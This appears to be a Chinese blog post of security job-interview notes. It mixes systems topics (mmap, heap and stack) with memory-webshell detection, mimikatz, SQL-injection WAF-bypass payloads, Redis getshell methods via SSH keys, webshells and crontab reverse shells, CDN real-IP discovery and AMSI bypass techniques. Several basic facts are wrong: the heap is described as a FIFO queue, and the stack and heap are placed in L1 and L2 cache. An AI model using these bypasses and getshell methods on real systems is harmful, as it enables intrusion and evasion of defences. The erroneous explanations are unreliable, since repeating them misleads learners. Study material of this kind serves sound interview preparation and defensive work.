而使用mmap操作文件中，创建新的虚拟内存区域和建立文件磁盘地址和虚拟内存区域映射这两步，没有任何文件拷贝操作。而之后访问数据时发现内存中并无数据而发起的缺页异常过程，可以通过已经建立好的映射关系，只使用一次数据拷贝，就从磁盘中将数据传入内存的用户空间中，供进程使用。

总而言之，常规文件操作需要从磁盘到页缓存再到用户主存的两次数据拷贝。而mmap操控文件，只需要从磁盘到用户主存的一次数据拷贝过程。说白了，mmap的关键点是实现了用户空间和内核空间的数据直接交互而省去了空间不同数据不通的繁琐过程。因此mmap效率更高。

mmap优点：

1、对文件的读取操作跨过了页缓存，减少了数据的拷贝次数，用内存读写取代I/O读写，提高了文件读取效率。

2、实现了用户空间和内核空间的高效交互方式。两空间的各自修改操作可以直接反映在映射的区域内，从而被对方空间及时捕捉。

3、提供进程间共享内存及相互通信的方式。不管是父子进程还是无亲缘关系的进程，都可以将自身用户空间映射到同一个文件或匿名映射到同一片区域。从而通过各自对映射区域的改动，达到进程间通信和进程间共享的目的。

同时，如果进程A和进程B都映射了区域C，当A第一次读取C时通过缺页从磁盘复制文件页到内存中；但当B再读C的相同页面时，虽然也会产生缺页异常，但是不再需要从磁盘中复制文件过来，而可直接使用已经保存在内存中的文件数据。

4、可用于实现高效的大规模数据传输。内存空间不足，是制约大数据操作的一个方面，解决方案往往是借助硬盘空间协助操作，补充内存的不足。但是进一步会造成大量的文件I/O操作，极大影响效率。这个问题可以通过mmap映射很好的解决。换句话说，但凡是需要用磁盘空间代替内存的时候，mmap都可以发挥其功效。

16、堆缓冲区溢出，返回地址保存位置
堆栈都是一种数据项按序排列的数据结构，只能在一端(称为栈顶(top))对数据项进行插入和删除。堆，队列优先,先进先出（FIFO—first in first out）。栈，先进后出(FILO—First-In/Last-Out)。

堆栈空间分配
栈（操作系统）：由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。

堆（操作系统）： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收，分配方式倒是类似于链表

堆栈缓存方式
栈使用的是一级缓存， 他们通常都是被调用时处于存储空间中，调用完毕立即释放。

堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定（并不是一旦成为孤儿对象就能被回收）。所以调用这些对象的速度要相对来得低一些。

堆栈数据结构区别
堆（数据结构）：堆可以被看成是一棵树，如：堆排序。

栈（数据结构）：一种先进后出的数据结构。

生长方向：对于堆来讲，生长方向是向上的，也就是向着内存地址增加的方向；对于栈来讲，它的生长方向是向下的，是向着内存地址减小的方向增长

碎 片问题：对于堆来讲，频繁的new/delete势必会造成内存空间的不连续，从而造成大量的碎片，使程序效率降低。对于栈来讲，则不会存在这个问题

分配方式：堆都是动态分配的，没有静态分配的堆。栈有2种分配方式：静态分配和动态分配。静态分配是编译器完成的，比如局部变量的分配。动态分配由alloca函数进行分配，但是栈的动态分配和堆是不同的，他的动态分配是由编译器进行释放，无需我们手工实现。

堆内存申请，释放，操作，特点：

堆内存申请环境:堆内存需要程序员在程序中申请 ，动态分配，申请的大小有程序决定。
堆内存申请方法：C语言中的malloc（） 函数 ， c++ 中的new（）函数。堆内存进行申请时候可能会申请失败，申请成功与失败与计算机性能，当前运行环境等有关。
堆内存释放：申请过后的堆内存不能由系统自动进行释放，C语言中采用 free() 函数，c++中采用 delete() 函数进行释放内存。
堆内存操作：申请过后的内存，会返回指向堆内存的指针，后续对于内存的读写等操作需要通过此指针进行。
堆内存特点：地址由低向高生长。 堆内存非线性，呈现无序状态。因此用到了链表。
栈内存申请，释放，操作，特点：

栈内存的申请是在程序中定义好的，比如数组，包括栈的大小，包含的变量（存储局部变量，数组，栈帧，函数返回地址等）
栈内存的释放是有程序自身决定的不用掉用函数，当程序退出时，栈内存会自动销毁，维持栈平衡，否则就会发生内存访问错误。
栈内存的操作 push pop 只有这两种操作。
栈内存的特点：由高地址向低地址生长，呈现线性规划。参考OD中栈缓冲区向上增长，即向低地址增长。
8.10阿里云 能力建设团队
60%安全研究漏洞挖掘，40%防御。产品技术团队，态势感知，webshell检测。溯源，操作系统原理。

1、内存马检测
Webshell内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度。

class dump 反编译为java代码，查看恶意代码，对比本地是否有class，可以根据特征缩小范围。

日志检测是否有一些可疑的请求

排查框架漏洞，反序列化漏洞

可疑的进程执行

可疑的命令执行

源码检测
在java中，只有被JVM加载后的类才能被调用，或者在需要时通过反射通知JVM加载。所以特征都在内存中，表现形式为被加载的class。需要通过某种方法获取到JVM的运行时内存中已加载的类， Java本身提供了Instrumentation类来实现运行时注入代码并执行，因此产生一个检测思路：注入jar包-> dump已加载class字节码->反编译成java代码-> 源码webshell检测。 这样检测比较消耗性能，我们可以缩小需要进行源码检测的类的范围，通过如下的筛选条件组合使用筛选类进行检测： ①新增的或修改的； ②没有对应class文件的 ③xml配置中没注册的 ④冰蝎等常见工具使用的 ⑤filterchain中排第一的filter类

对于敏感类（比如实现了javax.servlet.Filter接口的类）利用retransformClasses方法进行retransform，编写ClassFileTransformer实现类将这些敏感类加载的class dump出来，接着就可以使用反编译工具转换成源代码判断是否是Webshell，或者有一些webshell检测工具支持字节码的检测，比如：WebshellChop 就不用反编译可以进行批量的检测。

有一些工具可以辅助检测内存马，如java-memshell-scanner是通过jsp扫描应用中所有的filter和servlet，然后通过名称、对应的class是否存在来判断是否是内存马。

内存马排查
如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。

如果是jsp注入，日志中排查可疑jsp的访问请求。
如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法
根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。
如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。
如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200
要识别，我们就需要细思内存马有什么特征。下面列下我思考过的检查点。

filter名字很特别
内存马的Filter名一般比较特别，有shell或者随机数等关键字。这个特征稍弱，因为这取决于内存马的构造者的习惯，构造完全可以设置一个看起来很正常的名字。

2.filter优先级是第一位

为了确保内存马在各种环境下都可以访问，往往需要把filter匹配优先级调至最高，这在shiro反序列化中是刚需。但其他场景下就非必须，只能做一个可疑点。

3。对比web.xml中没有filter配置

内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，这也是个可以的特征。但servlet 3.0引入了@WebFilter标签方便开发这动态注册Filter。这种情况也存在没有在web.xml中显式声明，这个特征可以作为较强的特征。

4.特殊classloader加载

我们都知道Filter也是class，也是必定有特定的classloader加载。一般来说，正常的Filter都是由中间件的WebappClassLoader加载的。反序列化漏洞喜欢利用TemplatesImpl和bcel执行任意代码。所以这些class往往就是以下这两个：

com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader
com.sun.org.apache.bcel.internal.util.ClassLoader
这个特征是一个特别可疑的点了。当然了，有的内存马还是比较狡猾的，它会注入class到当前线程中，然后实例化注入内存马。这个时候内存马就有可能不是上面两个classloader。

5.对应的classloader路径下没有class文件

所谓内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的ClassLoader目录下是否存在class文件。

6.Filter的doFilter方法中有恶意代码

我们可以把内存中所有的Filter的class dump出来，使用fernflower等反编译工具分析看看，是否存在恶意代码，比如调用了如下可疑的方法：

java.lang.Runtime.getRuntime
defineClass
invoke
…
不难分析，内存马的命门在于5和6。简单说就是Filter型内存马首先是一个Filter类，同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦。大致检查的代码如下：

要想扫描web应用内存中的Filter和Servlet，我们必须知道它们存储的位置。通过查看代码，我们知道StandardContext对象中维护的是一个

和Filter相关的是filterDefs和filterMaps两个属性。这两个属性分别维护着全局Filter的定义，以及Filter的映射关系。和Servlet相关的是children和servletMappings两个属性。这两个属性分别维护这全家Servlet的定义，以及Servlet的映射关系。

request.getSession().getServletContext() {ApplicationContextFacade}  -> context {ApplicationContext}   -> context {StandardContext}  * filterDefs  * filterMaps  * children  * servletMappings
所以我们只需要通过反射遍历request，最终就可以拿到Filter和Servlet的如下信息。

Filter/Servlet名
匹配路径
Class名
ClassLoader
Class文件存储路径。
内存中Class字节码（方便反编译审计其是否存在恶意代码）
该Class是否有对应的磁盘文件（判断内存马的重要指标）
内存查杀
注销Filter

清除恶意代码

通过分析调试Tomcat源码，我们知道Tomcat注销filter其实就是将该Filter从全局filterDefs和filterMaps中清除掉。具体的操作分别如下removeFilterDef和removeFilterMap两个方法中。注销Servlet的原理也是类似，将该Servlet从全局servletMappings和children中清除掉即可。在Tomcat源码中对应的是removeServletMapping和removeChild方法。

2、mimikatz原理
对于 mimikatz 来说，通常套路来说，他想去读取内存就得获取调试权限，然后去打开进程。默认情况下，本地管理员组是有这个权限的。这里在没有更改原始本地策略和组策略的情况下，使用privilege::debug提升权限是能够提权成功的

调试权限允许某人调试他们原本无权访问的进程。例如，以在其令牌上启用调试权限的用户身份运行的进程可以调试作为本地系统运行的服务。调试权限是一种安全策略设置，允许用户将调试器附加到进程或内核。管理员可以修改用户组的安全策略以包含或删除此功能。正在调试自己的应用程序的开发人员不需要此用户权限。调试系统组件或调试远程组件的开发人员将需要此用户权限。此用户权限提供对敏感和关键操作系统组件的完全访问权限。默认情况下，为具有管理员权限的用户启用此属性。具有管理员权限的用户可以为其他用户组启用此属性。

Restricted Admin Mode
Restricted Admin Mode即受限管理员模式。最初为 Windows 8.1 和 Server 2012 R2 引入（win2008及之前的版本需要KB2871997、KB2973351补丁），受限管理模式是一项 Windows 功能，可防止将 RDP 用户的凭据存储在建立 RDP 连接的计算机的内存中。实际上，这将防止用户（通常是管理员）在 RDP 进入受感染主机后从内存中读取他们的凭据。为防止凭据存储在远程计算机上，受限管理员更改了远程桌面协议，使其使用网络登录而不是交互式登录进行身份验证。有了这种保护，建立 RDP 会话将不需要提供关联的密码；相反，用户的 NTLM Hash 或 Kerberos 票证将用于身份验证。客户端和服务器的受限管理员已向后 移植 到 Windows 7 和 Server 2008，但在大多数标准 Windows 版本上默认情况下仍处于禁用状态，这是由于围绕其使用的一些注意事项。
Credential Caching
DDC的发明就是为了方便域成员在访问不到域控的情况下诞生的。如果暂时访问不到域控的话，windows会尝试使用本机缓存的凭证进行认证，凭证在本机上默认缓存十条。

Credntial Caching即凭证缓存。HTTP Server API 仅在用于 NTLM 身份验证的 Keep-Alive (KA) 连接上缓存凭据。默认情况下，HTTP Server API 缓存在 KA 连接上发送的第一个请求中获得的凭据。客户端可以在没有授权头的情况下在 KA 连接上发送后续请求，并根据之前建立的上下文获取身份验证。在这种情况下，HTTP Server API 将基于缓存凭据的令牌发送到应用程序。代理发送的请求的凭据不会被缓存。应用程序通过在HTTP_SERVER_AUTHENTICATION_INFO 中设置DisableNTLMCredentialCaching标志来禁用 NTLM 凭据缓存在调用 HttpSetServerSessionProperty 或 HttpSetUrlGroupProperty 时提供的结构。当凭据缓存被禁用时，HTTP Server API 会丢弃缓存的凭据并为每个请求执行身份验证
WDigest
WDigest在mimikatz使用过程中的作用，我们知道WDigest利用HTTP和SASL进行身份验证，具体表现为把明文密码存在lsass.exe进程里通过http进行认证。

WDigest即摘要身份验证，摘要身份验证是一种质询/响应协议，主要在 Windows Server 2003 中用于 LDAP 和基于 Web 的身份验证。它利用超文本传输协议 (HTTP) 和简单身份验证安全层 (SASL) 交换进行身份验证。在较高级别上，客户端请求访问某些内容，身份验证服务器向客户端提出质询，客户端通过使用从密码派生的密钥对其响应进行加密来响应质询。将加密的响应与身份验证服务器上存储的响应进行比较，以确定用户是否具有正确的密码
3、SQL防御
过滤用户输入

预编译

变量类型的限定

4、劣势
优势：坚持，自学精神，抗压能力强，有兴趣。

劣势：入门稍晚，且没有一个长期的领路人，大部分依靠自学。

5、安全发展方向
攻击-蓝队-管理。

7、一些简历上的问题
8.10安恒杭州 安全研究
攻防对抗。安全研究，服务于攻击，域渗透，代码审计。

1、C段如何判断
旁站 旁站指的是网站所在服务器上部署的其他网站 旁注的意思就是从同台服务器上的其他网站入手，提权，然后把服务器端了，就自然把那个网站端了

C段 C段指的是例如192.168.1.4，192是A段，168是B段，1是C段，4是D段 C段嗅探指的是拿下同一C段下的服务器，也就是说是D段1-255中的一台服务器

即： 旁注：同服务器不同站点 C段：同网段不同服务器

2、信息收集与如何打入内网获取权限
NAT就网络地址转换，把内IP转换为外网IP，节省了IP地址，同时负责转换的设备无形中成为了一道屏障，从外网访问只能访问到你直连外网的路由或者有路由功能的交换机等设备，但内网设备是可以访问外网服务器

1、内网穿透。可以直接入侵路由器等设备，把内网某机器映射出来，很多家用小路由都支持这功能，比如“某联”的家用路由，大型点的路由更会有相关功能，比如某为的和某科的。把某内网机器的某个特定端口映射到外网，凡是访问此端口的数据全部转发给映射的计算机，就可以达到直接控制的目的，当然前提是你得有入侵计算机的能力。

2.要想让内网计算机主动访问你自己的服务器就只能通过类似于网页挂马，邮件传播，视频嵌入等一些手段让内网机器中木马的手段来实现。

3.漏洞提权 redis等探测内网端口 上传shell SSRF等。

3、解析漏洞
apache 后缀从后往前

nginx url后加php按照php解析

IIS 文件解析 目录解析 asp解析 url后加php按照php解析

可以解析的有哪些后缀？asa?

IIS文件解析缺陷（jsp,asa,cer,cdx）默认情况下，IIS对其后缀名都映射到了asp.dll，asp.dll又是ASP脚本的解析文件。

4、各种绕过方式（重点复习）
编码绕过： url，二次编码

大小写 双写 空格（括号，+号，注释绕过），内联注释绕过（/*！执行语句*/）

逗号过滤：join联合。在显示位上替换为常见的注入变量或其它语句

union select 1,2,3;  union select * from ((select 1)A join (select 2)B join (select 3)C）;  union select * from ((select 1)A join (select 2)B join (select group_concat(user(),' ',database(),' ',@@datadir))C);
逗号绕过SUBTTRING 函数：substring(str FROM pos)，从字符串str的起始位置pos 返回一个子串。

首先我们空格被过滤，这个绕过方法有很多
使用注释绕过，/**/，但是因为’/‘被过滤，导致此方法无法使用
使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格
使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a，这里我选择了%0a进行绕过
‘，’也被过滤掉了，我们需要使用union的查询需要逗号 通过查阅资料，找到了一种可以绕过的方法
可以使用join来进行绕过，可以绕过逗号，使用联合查询

5、如何判断出网？
各种协议判断目标是否出网 ”。

ICMP ping www.baidu.com

TCP/UDP telnet 192.168.1.108 22

HTTP/HTTPS curl http://www.baidu.com //HTTP

DNSdig @8.8.8.8 www.baidu.com

ping

邮件

6、内网穿透
端口映射是 NAT 的一种，它将外网主机的 IP 地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该 IP 的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。

对于内网来说，其不是不能主动访问公网端口，而是不能反过来有效的被公网访问。内网穿透的主要思路就是利用这一点，让在内网的节点主动访问一个拥有公网IP地址的服务器，并由中间服务器搭桥，打通经过该服务器从其他主机到NAT之后节点的隧道。

frp Ngrok Seveo

7、横向移动
8、Potato认证的原理
9、kerboros认证流程
10、内存马，Java反序列化
Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。

Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。

序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。

暴露或间接暴露反序列化 API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。

实现了Serializable接口，并且重写了readObject()函数。这里需要注意：只有实现了Serializable接口的类的对象才可以被序列化。

8.10 长亭科技北京 安全开发
安全研究 安全开发等岗位。

1、流量如何剔除异常
平均数 中位数 正态分布

2、SQL注入哪几种方式
3、报错注入的原理
报错函数

4、内存马如何检测
5、讲一讲拟态防御内存检测的项目
6、mimikatz获取密码的原理
7、网页爬虫如何批量操作
8.8奇安信A TEAM二面
红队

1、如何绕过waf
过滤/和空格：内联注释绕过。

过滤逗号，order by中：join联合。

2、XSS分类
3、跨域
same-site-cookie有哪些值

Cookie 的SameSite属性用来限制第三方 Cookie，从而减少安全风险。

它可以设置三个值。

Strict
Lax
None
2.1 Strict
Strict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。

Set-Cookie: CookieName=CookieValue; SameSite=Strict;
这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。

2.2 Lax
Lax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。

Set-Cookie: CookieName=CookieValue; SameSite=Lax;
2.3 None
Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。

下面的设置无效。

Set-Cookie: widget_session=abc123; SameSite=None
下面的设置有效。

Set-Cookie: widget_session=abc123; SameSite=None; Secure
跨域访问
jsonp
由于浏览器同源策略的限制，非同源下的请求，都会产生跨域问题，jsonp即是为了解决这个问题出现的一种简便解决方案。

同源策略即：同一协议，同一域名，同一端口号。当其中一个不满足时，我们的请求即会发生跨域问题。jsonp是如何突破同源策略的限制实现跨域的。

不管是我们的script标签的src还是img标签的src，或者说link标签的href他们没有被同源策略所限制。利用了 script 不受同源策略的限制。利用 <script> 标签没有跨域限制的漏洞，网页可以得到从其他来源动态产生的 JSON 数据。JSONP请求一定需要对方的服务器做支持才可以。且jQuery默认就会给JSONP的请求清除缓存。

缺点：只能 get 方式，易受到 XSS攻击

JSONP的实现流程

声明一个回调函数，其函数名(如show)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。
创建一个<script>标签，把那个跨域的API数据接口地址，赋值给script的src,还要在这个地址中向服务器传递该函数名（可以通过问号传参:?callback=show）。服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串,例如：传递进去的函数名是show，它准备好的数据是show('我不爱你')。
最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（show），对返回的数据进行操作。
CORS（Cross-Origin Resource Sharing）,跨域资源共享
CORS 需要浏览器和后端同时支持。IE 8 和 9 需要通过 XDomainRequest 来实现。

当使用XMLHttpRequest发送请求时，如果浏览器发现违反了同源策略就会自动加上一个请求头 origin；

后端在接受到请求后确定响应后会在 Response Headers 中加入一个属性 Access-Control-Allow-Origin；

浏览器判断响应中的 Access-Control-Allow-Origin 值是否和当前的地址相同，匹配成功后才继续响应处理，否则报错

缺点：忽略 cookie，浏览器版本有一定要求。

这种方式分为两种请求：

一种是简单请求，另一种是非简单请求

简单请求跨域：

请求方式为HEAD、POST 或者 GET

非简单请求跨域：

非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json

代理跨域请求(Nginx)
前端向发送请求，经过代理，请求需要的服务器资源

缺点：需要额外的代理服务器

4、Html5 postMessage 方法

允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本、多窗口、跨域消息传递

缺点：浏览器版本要求，部分浏览器要配置放开跨域限制

5、修改 document.domain 跨子域

相同主域名下的不同子域名资源，设置 document.domain 为 相同的一级域名

缺点：同一一级域名；相同协议；相同端口

6、基于 Html5 websocket 协议

websocket 是 Html5 一种新的协议，基于该协议可以做到浏览器与服务器全双工通信，允许跨域请求

缺点：浏览器一定版本要求，服务器需要支持 websocket 协议

7、document.xxx + iframe

通过 iframe 是浏览器非同源标签，加载内容中转，传到当前页面的属性中

缺点：页面的属性值有大小限制

总结
CORS支持所有类型的HTTP请求，是跨域HTTP请求的根本解决方案
JSONP只支持GET请求，JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。
不管是Node中间件代理还是nginx反向代理，主要是通过同源策略对服务器不加限制。
日常工作中，用得比较多的跨域方案是cors和nginx反向代理
4、redis未授权
写公钥和webshell：root权限才行。利用了redis数据库的备份功能，当redis以root身份运行，利用Redis的config set命令，只要内容为SSH公钥内容，文件路径满足公钥存放的位置，就可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。

利用了redis数据库的备份功能，在知道了网站路径以后，使用redis的CONFIG set命令，将文件内容为一句话木马，文件路径为网站根目录的wenshell写入目标服务器。前提条件：redis可以连接，且知道web目录路径。

首先同样利用了redis数据库的备份功能，在我们不知道网站绝对路径的时候，可以利用linux的定时任务特性：Linux会监测/etc/crontab的内容，当我们将反弹shell的命令使用redis备份到/etc/crontab中，就可以获得反弹shell。

而这种方式是通过写文件来完成GetShell的，这种方式的主要问题在于，redis保存的数据并不是简单的json或者是csv，所以写入的文件都会有大量的无用数据。一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了。

主从复制原理？

Redis主从复制
Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。

在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码。然后在从机上加载so文件，我们就可以执行拓展的新命令了。

1、禁止外部访问Redis服务端口

2、禁止使用root权限启动redis服务

3、配置安全组，限制可连接Redis服务器的IP

5、DNS记录中A MX TXT意思
A记录 - 保存域的IP地址的记录。

CNAME记录 - 将一个域或子域转发到另一个域，不提供IP地址。

MX记录 - 将邮件定向到电子邮件服务器。

TXT记录 - 允许管理员在记录中存储文本注释。

NS记录 - 存储DNS条目的名称服务器。

SRV记录 - 指定特定服务的端口。

cname解析记录：购买的主机/服务器都会有IP地址或者CANME地址。CNAME地址看上去其实就是一个域名地址，例如http://hello.youwebcloud.com 这就可以是一个CNAME地址，这个CNAME地址已经解析到一个IP地址1.1.1.1 。当我们把自己的域名解析到CNAME地址http://hello.youwebcloud.com的时候其实就解析到IP地址1.1.1.1

6、ping baidu返回却不是百度？
CDN

很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN。

使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN

7、如何绕过CDN找真实IP
方法1:查询历史DNS记录

MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。

方法2:查询子域名

所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。

方法3：网络空间引擎搜索法

常见的有以前的钟馗之眼，shodan，fofa搜索。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。

方法4:利用SSL证书寻找真实原始IP

Web应用程序***和其他一些安全服务，以保护你的服务免受攻击。为此，你的Web服务器就必须支持SSL并具有证书。当你在端口443（https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。攻击者将看到一个使用特定证书的IPv4主机列表，而真实原始 IP就藏在其中。

方法5:利用HTTP标头寻找真实原始IP

方法6:利用网站返回的内容寻找真实原始IP

方法7:使用国外主机解析域名

方法8:网站漏洞查找

1）目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。 2）XSS盲打，命令执行反弹shell，SSRF等。 3）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。

方法9:网站邮件订阅查找

RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。

方法10：用 Zmap 扫全网

需要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。

方法11：F5 LTM解码法

当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。

8、nginx反向代理
反向代理
反向代理服务器架设在服务器端，通过缓冲经常被请求的页面来缓解服务器的工作量，将客户机请求转发给内部网络上的目标服务器；并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器与目标主机一起对外表现为一个服务器。

目前web网站使用反向代理，除了可以防止外网对内网服务器的恶性攻击、缓存以减少服务器的压力和访问安全控制之外，还可以进行负载均衡，将用户请求分配给多个服务器。

Nginx作为近年来较火的反向代理服务器，安装在目的主机端，主要用于转发客户机请求，后台有多个http服务器提供服务，nginx的功能就是把请求转发给后面的服务器，决定哪台目标主机来处理当前请求。

反向代理：看下面原理图，就一目了然。其实客户端对代理是无感知的，因为客户端不需要任何配置就可以访问，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，在返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器 IP 地址。 图片

全局块，events块，http块。设置一些影响 Nginx 服务器整体运行的配置指令。events 块涉及的指令主要影响 Nginx 服务器与用户的网络连接。

Nginx 服务器配置中最频繁的部分，代理、缓存和日志定义等绝大多数功能和第三方模块的配置都在这里。需要注意的是：http 块也可以包括 http 全局块、server 块。下面的反向代理、动静分离、负载均衡都是在这部分中配置

①、http 全局块 http 全局块配置的指令包括：文件引入、MIME-TYPE 定义、日志自定义、连接超时时间、单链接请求数上限等。

②、server 块 这块和虚拟主机有密切关系，虚拟主机从用户角度看，和一***立的硬件主机是完全一样的，该技术的产生是为了节省互联网服务器硬件成本。

每个 http 块可以包括多个 server 块，而每个 server 块就相当于一个虚拟主机。而每个 server 块也分为全局 server 块，以及可以同时包含多个 locaton 块。

正向代理
如果把局域网外的 Internet 想象成一个巨大的资源库，则局域网中的客户端要访问 Internet，则需要通过代理服务器来访问，这种代理服务就称为正向代理

正向代理和反向代理的区别，一句话就是：如果我们客户端自己用，就是正向代理。如果是在服务器用，我们用户无感知，就是反向代理。

9、个人机
10、ASMI绕过
AMSI（Antimalware Scan Interface）， 即反恶意软件扫描接口。在Windows Server 2016和Win10上默认安装并启用。powershell2.0以上。混淆。禁用卸载。

检测对象

文件
内存
数据流
检测目的

对抗基于脚本的攻击检测
对抗无文件攻击检测
绕过
降级攻击

PowerShell v2版不支持AMSI，作为常用手段，将目标主机中的PowerShell降级至PowerShell v2简单快捷。

混淆

虽然文章开始给的脚本经过base64编码后依然能被AMSI检测，但是增强混淆程度也是绕过AMSI的有效方法之一。

以下是绕过字符串检测，执行“被禁止”代码的3种方法：简单地将单词分成两部分，就足以欺骗这种检测方案；当然，也可以使用XOR来欺骗AMSI，并在运行时将字符串解码到内存中。这是更为有效的方式，因为需要更高级的技术来对其进行检测。

禁用AMSI

修改注册表，将HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable的表项值置为0。
关闭Windows Defender使系统自带的AMSI检测无效化。
利用反射将内存中AmsiScanBuffer方法的检测长度置为0。
COM劫持

寻找优先加载并无效的COM表项，在注册表中将Provider的路径指向到无效路径。这样，Powershell中的AMSI功能将无法加载，从而失效。已经被修复。不过还可以通过DLL劫持绕过AMSI。

DLL劫持

首先，我们先看下应用程序导入DLL优先级（Windows XP SP2以后版本）

进程对应的应用程序所在目录；
系统目录（通过 GetSystemDirectory 获取）；
16位系统目录；
Windows目录（通过 GetWindowsDirectory 获取）；
当前目录；
PATH环境变量中的各个目录；
可以看到第一条，与应用程序同级的目录的dll会被优先加载。利用这一点。我们在C:\Windows\System32\WindowsPowerShell\v1.0下放置一个伪造AMSI.dll，就可以实现DLL劫持，而不会调用系统的amsi.dll（C:\Windows\System32\asmi.dll, 如下）。

缓解方案
开启全部系统日志并分析;
至少开启Powershell脚本块，Sysmon和进程创建日志;
安装4.0以上版本Powershell;
卸载或者禁用2.0版本Powershell;
开启Powershell的相关安全机制如APPLocker，Device Guard, Credential Guard 等;
使用AMSI并关注绕过技术.
图片 点击下方小卡片或扫描下方二维码观看更多技术文章图片

猪猪谈安全  2023-03-14 19:49 发表于江苏
8.6 奇安信A TEAM一面
红队

1、黄金票据原理

2、哈希传递

3、访问主机文件系统开启端口

SMB 445

4、udf提权dump_file为啥不是out_file

into outfile 函数 会 在行末端写入新行 更致命的 是会转义 换行符

into outfile事实上是可以完整导出每行记录的.这个很适合导库；而into dump是不行的 它只能导出 一行数据!

dump_file写入原意，未添加新行，into dumpfile 就能导出 一个完整能执行的2进制 文件，into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。

